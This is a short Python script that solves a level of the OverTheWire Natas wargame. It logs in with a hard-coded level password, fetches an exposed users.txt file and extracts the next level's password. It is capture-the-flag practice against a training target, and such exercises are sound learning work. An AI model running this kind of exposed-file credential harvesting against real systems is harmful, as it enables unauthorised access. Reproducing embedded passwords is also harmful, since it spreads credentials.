import requests
import re

username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'

url = f"http://{username}.natas.labs.overthewire.org/" + "files/users.txt"

response = requests.get(url, auth = (username, password) )

#print(response.text)

print(re.findall('natas3:(.*)\n', response.text)[0])
